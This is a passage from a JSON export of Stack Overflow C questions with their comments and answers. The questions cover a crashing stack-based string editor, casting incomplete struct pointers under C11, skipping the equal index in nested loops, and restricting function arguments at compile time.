../sysdeps/x86_64/multiarch/strcat-sse2-unaligned.S:46\n</code></pre>\n  \n  <h1>0  __strcat_sse2_unaligned ()</h1>\n\n<pre><code>at ../sysdeps/x86_64/multiarch/strcat-sse2-unaligned.S:46\n</code></pre>\n  \n  <h1>1  0x000055de73f4999a in strcat (__src=,</h1>\n\n<pre><code>__dest=&lt;optimized out&gt;)\n\nat /usr/include/x86_64-linux-gnu/bits/string_fortified.h:128\n</code></pre>\n  \n  <h1>2  append (w=, sptr=0x55de7530c260)</h1>\n\n<pre><code>at solution.c:31\n</code></pre>\n  \n  <h1>3  0x000055de73f49808 in main () at solution.c:90</h1>\n</blockquote>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct stack\n{\n    char** stk;\n    int top;\n}STACK;\n\nvoid pop(STACK* s)\n{\n    s -&gt; top--; \n}\n\nchar* peek(STACK* sptr)\n{\n    char* x = sptr -&gt; stk[sptr -&gt; top]; \n    return x;\n}\n\nvoid push(char* w, STACK* sptr)\n{\n    sptr -&gt; stk[++sptr -&gt; top] = w; \n}\n\nvoid append(char* w, STACK* sptr)\n{\n    char* s1 = peek(sptr);\n    strcat(s1, w);\n    push(s1, sptr);\n\n}\n\nvoid del(int k, STACK* sptr)\n{\n    char* s = peek(sptr);\n    char* s1;\n\n    for(int i = 0; i &lt; strlen(s) - k; ++i)\n    {\n        s1[i] = s[i];\n    }\n\n    push(s1, sptr);\n}\n\nvoid undo(STACK* sptr)\n{\n    pop(sptr);\n}\n\nchar print(int k, STACK* sptr)\n{\n    char* s = peek(sptr);\n    return s[k - 1];\n}\n\n\nint main()\n{\n\n    int times;\n    int fn;\n    char s[21];\n    int k;\n    STACK* sptr = (STACK*)malloc(sizeof(STACK));\n    sptr -&gt; stk = (char**)malloc(100 * sizeof(char*));\n\n\n    // 1 append string s to existing\n    // 2 delete last k chars\n    // 3 print kth character of string\n    // 4 undo\n\n    // input times\n    scanf(\"%d\", &amp;times);\n\n    for(int i = 0; i &lt; times; ++i)\n    {\n        // enter function number\n        scanf(\"%d\", &amp;fn);\n\n        switch(fn)\n        {\n            case 1: // take string\n\n                    scanf(\"%s\", s);\n                    append(s, sptr);\n                    break;\n\n            case 2: // take k int\n\n                    scanf(\"%d\", &amp;k);\n                    del(k, sptr);\n                    break;\n\n            case 3: // k int\n\n                    scanf(\"%d\", &amp;k);\n                    char k = print(k, sptr);\n                    printf(\"%c\", k);\n                    break;\n\n            case 4: // just call pop\n                    pop(sptr);\n                    break;\n        }\n    }\n\n\n    return 0;\n}\n</code></pre>\n\n<blockquote>\n  <p>edit 1: changed char* s to char s[21]; as pointed out by @Sourav\n  Ghosh.</p>\n  \n  <p>but getting another error as following ....... :/</p>\n  \n  <blockquote>\n    <p>Process 35026 stopped\n    * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)\n        frame #0: 0x0000000100000c57 a.out`peek(sptr=0x0000000100100320) at undo.c:19    16       17      char* peek(STACK* sptr)    18   {\n    -> 19         return sptr -> stk[sptr -> top];     20     }    21         22      void push(char* w, STACK* sptr) Target 0: (a.out) stopped. (lldb)</p>\n  </blockquote>\n</blockquote>\n"}, {"tags": ["c", "language-lawyer", "c11", "strict-aliasing"], "comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 1, "creation_date": 1545835770, "post_id": 53933416, "comment_id": 94707326, "body": "Casting between pointers to struct types is fine by itself.  The question is what specifically do you do with those pointers afterward.  A more complete example would help."}, {"owner": {"reputation": 1005, "user_id": 10674275, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1710877d569a65bda20b7c7c0865b4c?s=128&d=identicon&r=PG&f=1", "display_name": "Julius", "link": "https://stackoverflow.com/users/10674275/julius"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1545836103, "post_id": 53933416, "comment_id": 94707423, "body": "@dbush Casting the struct pointer back to a <code>char *</code> is the only thing which is done afterwards. The <code>char *</code> is then read and modified. The structs will never be complete. However, I was reading that having two incompatible types pointing to the same object can be invalid, is that false?"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 2, "creation_date": 1545836429, "post_id": 53933416, "comment_id": 94707555, "body": "Strict aliasing comes into play if you read an object of one type via a pointer to another type (other than <code>char *</code>).  I don&#39;t see that happening here."}], "answers": [{"comments": [{"owner": {"reputation": 1005, "user_id": 10674275, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1710877d569a65bda20b7c7c0865b4c?s=128&d=identicon&r=PG&f=1", "display_name": "Julius", "link": "https://stackoverflow.com/users/10674275/julius"}, "edited": false, "score": 0, "creation_date": 1545837458, "post_id": 53933758, "comment_id": 94707904, "body": "Thank you! What about <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7p4\" rel=\"nofollow noreferrer\">6.7</a> and <a href=\"http://port70.net/~nsz/c/c11/n1570.html#J.2\" rel=\"nofollow noreferrer\">UB</a> <code>An object is assigned to an inexactly overlapping object or to an exactly overlapping object with incompatible type</code> - are the provided examples not affected by this?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 1005, "user_id": 10674275, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1710877d569a65bda20b7c7c0865b4c?s=128&d=identicon&r=PG&f=1", "display_name": "Julius", "link": "https://stackoverflow.com/users/10674275/julius"}, "edited": false, "score": 0, "creation_date": 1545837938, "post_id": 53933758, "comment_id": 94708037, "body": "The only objects in the examples are pointers (to incomplete structure types).  The assignments are all kosher; there are no inexactly overlapping objects, and the types are not not incompatible \u2014 though that section of the standard (<a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.2.7\" rel=\"nofollow noreferrer\">&#167;6.2.7 Compatible type and composite type</a> is one of the more inscrutable ones.  One thing it defines is that separate translation units with the same text for the types can be used to create code that can be linked together to make a coherent program.  I don&#39;t think that &#167;6.7 &#182;4 or UB is applicable here."}, {"owner": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "edited": false, "score": 0, "creation_date": 1545845255, "post_id": 53933758, "comment_id": 94710421, "body": "I&#39;m trying to understand the sentence <code>All pointers to structure types shall have the same representation and alignment requirements as each other</code> but I&#39;m struggling. Can you please explain in details? does it means that all pointers in my programs that points to many different structures, has same address alignment? and if so, what is the alignment value? and what <code>same representation</code> means?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 3510, "user_id": 2162550, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f74689baa9af8a44163fa395c457212f?s=128&d=identicon&r=PG", "display_name": "user2162550", "link": "https://stackoverflow.com/users/2162550/user2162550"}, "edited": false, "score": 1, "creation_date": 1545845899, "post_id": 53933758, "comment_id": 94710626, "body": "@user2162550: Ouch \u2014 good question, complex answer.  First off, it means that all pointers to structures are the same size, regardless of the structure type.  So, <code>sizeof(struct Foo *) == sizeof(struct Bar *)</code> independent of how (or even if) the bodies of the structures are defined. Second, it means that if a <code>struct Foo *</code> needs to be aligned on an 8-byte boundary, so does a <code>struct Bar *</code>. The &#39;same representation&#39; requirement imposes conditions on machines (mainframes) that used to exist but are mainly museum pieces now \u2014 they&#39;re probably less powerful than your cell phone. <i>[\u2026continued\u2026]</i>"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1545846181, "post_id": 53933758, "comment_id": 94710714, "body": "<i>[\u2026continuation\u2026]</i>  Some mainframes had complex hardware descriptors for things like pointers which provided checking on whether the pointer was being abused.  The &#39;same representation&#39; rule is saying that those machines can&#39;t object to converting a <code>struct Foo *</code> into a <code>struct Bar *</code> or vice versa.  I&#39;m not sure if they&#39;re allowed to complain if you used the converted pointer to access the wrong type.  However, such machines are now rarely found in the field.  See Wikipedia on <a href=\"https://en.wikipedia.org/wiki/ICL_2900_Series\" rel=\"nofollow noreferrer\">ICL 2900 Series</a> for one example (3 mips; 8 MiB memory)."}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 3, "last_activity_date": 1545836815, "last_edit_date": 1592644375, "creation_date": 1545836815, "answer_id": 53933758, "question_id": 53933416, "link": "https://stackoverflow.com/questions/53933416/is-casting-incomplete-struct-pointers-undefined-behavior/53933758#53933758", "title": "Is casting incomplete struct pointers undefined behavior?", "body": "<p>One key relevant part of the standard is C11 <a href=\"http://port70.net/%7Ensz/c/c11/n1570.html#6.2.5p28\" rel=\"nofollow noreferrer\">\u00a76.2.5 Types \u00b628</a>:</p>\n<blockquote>\n<p>28 A pointer to void shall have the same representation and alignment requirements as a pointer to a character type.<sup>48)</sup> Similarly, pointers to qualified or unqualified versions of compatible types shall have the same representation and alignment requirements. All pointers to structure types shall have the same representation and alignment requirements as each other. All pointers to union types shall have the same representation and alignment requirements as each other. Pointers to other types need not have the same representation or alignment requirements.</p>\n<p><sup>48)</sup> The same representation and alignment requirements are meant to imply interchangeability as arguments to functions, return values from functions, and members of unions.</p>\n</blockquote>\n<p>Another is <a href=\"http://port70.net/%7Ensz/c/c11/n1570.html#6.3\" rel=\"nofollow noreferrer\">\u00a76.3 Conversions</a> and particularly <a href=\"http://port70.net/%7Ensz/c/c11/n1570.html#6.3.2.3p7\" rel=\"nofollow noreferrer\">\u00a76.3.2.3 Pointers \u00b67</a>:</p>\n<blockquote>\n<p>7 A pointer to an object type may be converted to a pointer to a different object type. If the resulting pointer is not correctly aligned<sup>68)</sup> for the referenced type, the behavior is undefined. Otherwise, when converted back again, the result shall compare equal to the original pointer. When a pointer to an object is converted to a pointer to a character type, the result points to the lowest addressed byte of the object. Successive increments of the result, up to the size of the object, yield pointers to the remaining bytes of the object.</p>\n<p><sup>68)</sup> In general, the concept ''correctly aligned'' is transitive: if a pointer to type A is correctly aligned for a pointer to type B, which in turn is correctly aligned for a pointer to type C, then a pointer to type A is correctly aligned for a pointer to type C.</p>\n</blockquote>\n<p>Thus, my understanding is that there is no problem with either example code fragment shown in the question.  The structure types are incomplete, but that is not a problem for the operations shown.  The 'and then' sections of the code need not be problematic \u2014 it depends on what is actually there.</p>\n"}], "owner": {"reputation": 1005, "user_id": 10674275, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1710877d569a65bda20b7c7c0865b4c?s=128&d=identicon&r=PG&f=1", "display_name": "Julius", "link": "https://stackoverflow.com/users/10674275/julius"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 130, "favorite_count": 1, "accepted_answer_id": 53933758, "answer_count": 1, "score": -1, "last_activity_date": 1545836815, "creation_date": 1545834802, "last_edit_date": 1545835556, "question_id": 53933416, "link": "https://stackoverflow.com/questions/53933416/is-casting-incomplete-struct-pointers-undefined-behavior", "title": "Is casting incomplete struct pointers undefined behavior?", "body": "<p>I was currently reading about some strict aliasing rules, and I was wondering whether casting a pointer to an incomplete struct is undefined behavior.</p>\n\n<p><strong>Example 1</strong>:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n\nstruct abc;\n\nint main(int argc, char *argv[])\n{\n  struct abc *mystruct;\n  char *buf;\n\n  buf = malloc(100);\n  mystruct = (struct abc*)buf;\n\n  // and then mystruct could be submitted to a function, where it is\n  // casted back to a \"char *\", the \"struct abc\" will never be completed.\n\n  return 0;\n}\n</code></pre>\n\n<p><strong>Example 2</strong>:</p>\n\n<pre><code>struct abc1;\nstruct abc2;\n\nint foo(struct abc1 *mystruct1)\n{\n  struct abc2 *mystruct2;\n\n  mystruct2 = (struct abc2 *)mystruct1;\n\n  // and then mystruct2 could be submitted to a function, where it is\n  // casted to a \"char *\", both structs stay incomplete.\n\n  return 0;\n}\n</code></pre>\n\n<p>So, my question: Is casting pointers to incomplete structs like in those two examples prohibited by the c11 standard, and if so, which part of the standard does forbid it?</p>\n"}, {"tags": ["c", "logic", "nested-loops"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1545834302, "post_id": 53933275, "comment_id": 94706902, "body": "You could use two inner loops to avoid <code>j != i</code> with: <code>for(j=0;j&lt;i;j++) {...} for(j=i+1;j&lt;N;j++) {...}</code> but is this particular check a bottleneck?"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545836529, "post_id": 53933275, "comment_id": 94707592, "body": "@WeatherVane: I only noticed your comment after posting my answer... I am not surprised we are once again in complete agreement."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1545837227, "post_id": 53933275, "comment_id": 94707821, "body": "@chqrlie should your second loop be <code>for (++j; </code> etc ? Am unsure where the sequence point is."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545837433, "post_id": 53933275, "comment_id": 94707895, "body": "@WeatherVane: I made the code more explicit about this <code>j++</code>."}, {"owner": {"reputation": 21, "user_id": 5896312, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/--IBNLI2Xvmw/AAAAAAAAAAI/AAAAAAAAAPM/hNlV5yLwStU/photo.jpg?sz=128", "display_name": "Peter C", "link": "https://stackoverflow.com/users/5896312/peter-c"}, "edited": false, "score": 0, "creation_date": 1545837720, "post_id": 53933275, "comment_id": 94707980, "body": "Thank you both. A separate loop did indeed shave off a good 15% CPU time for the overall code."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1545914800, "post_id": 53933275, "comment_id": 94729204, "body": "@PeterC: you can accept the answer by clicking on the grey checkmark below its score and upvote it once you have enough reputation points."}], "answers": [{"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 0, "last_activity_date": 1545837387, "last_edit_date": 1545837387, "creation_date": 1545836342, "answer_id": 53933673, "question_id": 53933275, "link": "https://stackoverflow.com/questions/53933275/nested-loop-when-inner-loop-index-unequal-outer-loop-index/53933673#53933673", "title": "Nested loop when inner loop index unequal outer loop index", "body": "<p>You can split the inner loop into 2 separate <code>for</code> loops to reduce the number of tests:</p>\n\n<pre><code>for (i = 0; i &lt; N; i++) {\n    for (j = 0; j &lt; i; j++) {\n        ... some code\n    }\n    /* here we have j == i, skip this one */\n    j++;\n    for (; j &lt; N; j++) {\n        ... same code\n    }\n}\n</code></pre>\n\n<p>This results in more code but half as many tests on <code>j</code>. Note however that if <code>N</code> is a constant, the compiler might unroll the original inner loop more efficiently. Careful benchmarking is the only way to determine if this solution is worth the effort for your problem, compiler and architecture.</p>\n\n<p>For completeness, this code can be simplified as:</p>\n\n<pre><code>for (i = 0; i &lt; N; i++) {\n    for (j = 0; j &lt; i; j++) {\n        ... some code\n    }\n    /* here we have j == i, skip this one */\n    while (++j &lt; N) {\n        ... same code\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 5896312, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/--IBNLI2Xvmw/AAAAAAAAAAI/AAAAAAAAAPM/hNlV5yLwStU/photo.jpg?sz=128", "display_name": "Peter C", "link": "https://stackoverflow.com/users/5896312/peter-c"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 197, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1545837387, "creation_date": 1545833881, "question_id": 53933275, "link": "https://stackoverflow.com/questions/53933275/nested-loop-when-inner-loop-index-unequal-outer-loop-index", "title": "Nested loop when inner loop index unequal outer loop index", "body": "<p>Nested loop logic to skip the inner loop when its index equals the outer loop index.</p>\n\n<p>Used an if statement within the inner loop to the effect of:</p>\n\n<pre><code>for (i=0;i&lt;N;i++)\n  for (j=0;j&lt;N;j++)\n    if (j!=i)\n      ... some code\n</code></pre>\n\n<p>I believe this gives me the expected results but is there a less CPU consuming method that I may not be aware of?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545830447, "post_id": 53932643, "comment_id": 94705593, "body": "An int <i>is</i> binary"}, {"owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "edited": false, "score": 0, "creation_date": 1545830607, "post_id": 53932643, "comment_id": 94705644, "body": "Okay, then let&#39;s simply simplify (ugh) the question into <code>how to do this in C</code>."}, {"owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545830681, "post_id": 53932643, "comment_id": 94705675, "body": "@AnttiHaapala That&#39;s just an example. :p  I can&#39;t think of other examples right now."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545830771, "post_id": 53932643, "comment_id": 94705709, "body": "Do <b>what</b>? To ensure that a constant argument does not have digits other than 0 or 1 in base 10 representation at compile time? Yes it can be done in C11, and it doesn&#39;t make any sense. If you mean checking an argument at compile time, then the only thing that is going to work about 100 % is to cause the erroneous condition to create a bitfield of negative length."}, {"owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "edited": false, "score": 0, "creation_date": 1545830874, "post_id": 53932643, "comment_id": 94705738, "body": "Fine, let&#39;s change the example to converting <b>IT</b> into <b>hexadecimal form</b>."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545830953, "post_id": 53932643, "comment_id": 94705764, "body": "@LaiYanHui it doesn&#39;t help any. The example is bad. You need a proper example to motivate an answer."}, {"owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545831327, "post_id": 53932643, "comment_id": 94705902, "body": "@AnttiHaapala How&#39;s that now?"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 1, "creation_date": 1545831367, "post_id": 53932643, "comment_id": 94705916, "body": "@LaiYanHui worse. Now that cannot be done at build time with C."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545831424, "post_id": 53932643, "comment_id": 94705933, "body": "@AnttiHaapala What did you have in mind for the digit checking?  I admit I can&#39;t figure out how you&#39;d do that."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1545831582, "post_id": 53932643, "comment_id": 94705978, "body": "@dbush well, a horrible terrible dreadful nested conditional expression using divisions and remainders that will then set the field width in a throwaway bitfield..."}, {"owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545831775, "post_id": 53932643, "comment_id": 94706045, "body": "@AnttiHaapala Please, you&#39;re an expert in C. (Hey, not trying to argue here.) All I want is to BLOCK away certain values to become the parameter. <b><code>And the point of the question is mainly how to do that,</code></b> but not how&#39;s the conversion can be done."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545831899, "post_id": 53932643, "comment_id": 94706089, "body": "You cannot block values from becoming arguments to a function. You can use a <i>macro</i> to mask the actual function and it can do <b>some dirty tricks</b> with <b>some values</b> given as the macro arguments."}, {"owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "edited": false, "score": 0, "creation_date": 1545832560, "post_id": 53932643, "comment_id": 94706339, "body": "How can this be done? Can you please answer the question by <code>Post Your Answer</code> beneath? Kinda desperate here."}, {"owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "edited": false, "score": 0, "creation_date": 1545833188, "post_id": 53932643, "comment_id": 94706571, "body": "Hello~ echos? Where are you? <code>But nobody came.</code> <code>But nobody came. (echoes through the walls)</code>"}, {"owner": {"reputation": 34185, "user_id": 5470596, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BITFt.jpg?s=128&g=1", "display_name": "YSC", "link": "https://stackoverflow.com/users/5470596/ysc"}, "edited": false, "score": 0, "creation_date": 1545837361, "post_id": 53932643, "comment_id": 94707876, "body": "FYI: often the idea of a question is good but the way it is asked lead to downvotes. See how <a href=\"https://stackoverflow.com/q/53933634/5470596\">another version of this question</a> is well received by the C++ community."}, {"owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "edited": false, "score": 0, "creation_date": 1545837690, "post_id": 53932643, "comment_id": 94707969, "body": "LOL, nice explanation StoryTeller. (That&#39;s good to know, BTW.)"}], "answers": [{"comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545834217, "post_id": 53933277, "comment_id": 94706875, "body": "And... of course you can skip this test with <code>(num_sys_convert)(911, base, 10)</code> and by explicitly declaring the function without the macro and..."}, {"owner": {"reputation": 67, "user_id": 10829048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/138f16c7efae685ea12f43828c927685?s=128&d=identicon&r=PG&f=1", "display_name": "Lai Yan Hui", "link": "https://stackoverflow.com/users/10829048/lai-yan-hui"}, "edited": false, "score": 0, "creation_date": 1545836990, "post_id": 53933277, "comment_id": 94707740, "body": "LOL, that&#39;s funny but better than nothing. (I think I&#39;ll use this if there are no more better answers/suggestions, XD.)"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": 